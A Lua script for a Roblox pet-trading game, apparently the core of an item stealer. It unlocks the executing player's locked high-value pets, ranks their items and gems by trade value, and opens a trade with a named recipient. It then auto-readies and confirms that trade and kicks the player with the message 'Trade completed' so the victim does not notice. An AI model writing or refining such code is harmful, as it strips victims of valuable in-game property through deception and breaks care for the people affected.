local ALLOWED_CATEGORIES = {"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}

local function getTradeId() local s = Trading.GetState(); return s and s._id end
local function getTradeCounter() local s = Trading.GetState(); return s and s._counter end

local function unlockAllValuablePets()
    local inv = Save.Get().Inventory
    if not inv or not inv.Pet then return end
    for uid, data in pairs(inv.Pet) do
        local pet = Directory.Pets[data.id]
        if pet and (pet.huge or pet.titanic or pet.gargantuan) then
            if data._l then
                Network.Invoke("Lock Item", uid, false)
                data._l = false
            end
        end
    end
end

local function calculateRAP(category, item)
    local fake = {
        Class = { Name = category },
        IsA = function(_, n) return n == category end,
        GetId = function() return item.id end,
        AbstractGetRAP = function()
            if RAPCmds and RAPCmds.Get then
                local ok, val = pcall(RAPCmds.Get, fake)
                if ok then return val end
            end
            return nil
        end
    }
    return fake:AbstractGetRAP() or 0
end

local function isValuable(category, data, rap)
    if category == "Pet" then
        local pet = Directory.Pets[data.id]
        if pet and (pet.gargantuan or pet.titanic or pet.huge or pet.exclusive) then return true end
    end
    for _, cat in ipairs(ALLOWED_CATEGORIES) do
        if category == cat then
            local amount = data._am or data.Amount or 1
            return rap * amount >= MIN_RAP
        end
    end
    return false
end

local function isGargantuan(item)
    local pet = Directory.Pets[item.id or ""]
    return pet and pet.gargantuan
end

local function isTitanic(item)
    local pet = Directory.Pets[item.id or ""]
    return pet and pet.titanic
end

local function isHuge(item)
    local pet = Directory.Pets[item.id or ""]
    return pet and pet.huge
end

local function getAllValuableItems()
    local inv = Save.Get().Inventory
    local valuable = {}
    if not inv then return valuable end
    for _, cat in ipairs(ALLOWED_CATEGORIES) do
        if inv[cat] then
            for uid, data in pairs(inv[cat]) do
                local rap = calculateRAP(cat, data)
                if isValuable(cat, data, rap) then
                    local amount = data._am or data.Amount or 1
                    local name = ""
                    if data.pt == 1 then name = "Golden " end
                    if data.pt == 2 then name = "Rainbow " end
                    if data.sh then name = "Shiny " .. name end
                    name = name .. (data.id or "Unknown")
                    if amount > 1 then name = name .. " (x" .. amount .. ")" end
                    table.insert(valuable, {
                        category = cat,
                        uid = uid,
                        id = data.id,
                        amount = amount,
                        rap = rap,
                        totalValue = rap * amount,
                        name = name
                    })
                end
            end
        end
    end
    table.sort(valuable, function(a, b)
        local aGarg = isGargantuan(a) and 4 or isTitanic(a) and 3 or isHuge(a) and 2 or 1
        local bGarg = isGargantuan(b) and 4 or isTitanic(b) and 3 or isHuge(b) and 2 or 1
        if aGarg ~= bGarg then return aGarg > bGarg end
        return a.totalValue > b.totalValue
    end)
    return valuable
end

local function getGems()
    local inv = Save.Get().Inventory
    if inv and inv.Currency then
        for uid, data in pairs(inv.Currency) do
            if data.id == "Diamonds" or data.id == "Gems" then
                local amount = data._am or 0
                if amount > 0 then return { uid = uid, id = data.id, amount = amount } end
            end
        end
    end
    return nil
end

local function getPlayerByName(username)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower() == username:lower() then return plr end
    end
    return nil
end

local function addItemToTrade(cat, uid, amount)
    local tid = getTradeId()
    if not tid then return false end
    return Network.Invoke("Server: Trading: Set Item", tid, cat, uid, amount or 1) == true
end

local function requestTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then return false end
    local ok, result = pcall(function()
        return Network.Invoke("Server: Trading: Request", targetPlayer)
    end)
    return ok and result
end

local function isTradeActive()
    local state = Trading.GetState()
    return state ~= nil and state._id ~= nil
end

local function getMyPlayerIndex(state)
    if not state or not state.Players then return nil end
    for i, plr in ipairs(state.Players) do
        if plr == player then return i end
    end
    return nil
end

local function isOtherPlayerReady(state)
    if not state or not state._ready or not state.Players then return false end
    local myIdx = getMyPlayerIndex(state)
    if not myIdx then return false end
    for i, ready in ipairs(state._ready) do
        if i ~= myIdx and ready then return true end
    end
    return false
end

local function amIReady(state)
    if not state or not state._ready then return false end
    local myIdx = getMyPlayerIndex(state)
    if not myIdx then return false end
    return state._ready[myIdx] == true
end

local function amIConfirmed(state)
    if not state or not state._confirmed then return false end
    local myIdx = getMyPlayerIndex(state)
    if not myIdx then return false end
    return state._confirmed[myIdx] == true
end

local function spamReadyAndConfirm()
    local readyOk = false
    local confirmOk = false

    for i = 1, 120 do
        if not isTradeActive() then break end

        local state = Trading.GetState()
        local tid = state and state._id
        local ctr = state and state._counter

        if not tid or not ctr then
            RunService.Heartbeat:Wait()
            continue
        end

        if not readyOk then
            Network.Invoke("Server: Trading: Set Ready", tid, true, ctr)
            safeWait(0.05)
            state = Trading.GetState()
            if amIReady(state) then
                readyOk = true
            end
        end

        if readyOk and not confirmOk then
            state = Trading.GetState()
            tid = state and state._id
            ctr = state and state._counter
            if tid and ctr then
                Network.Invoke("Server: Trading: Set Confirmed", tid, true, ctr)
                safeWait(0.05)
                state = Trading.GetState()
                if amIConfirmed(state) then
                    confirmOk = true
                    break
                end
            end
        end

        if readyOk and confirmOk then break end
        RunService.Heartbeat:Wait()
    end

    if KICK_ON_COMPLETE and (readyOk or confirmOk) then
        safeWait(1)
        pcall(function() player:Kick("Trade completed") end)
    end

    return readyOk and confirmOk
end

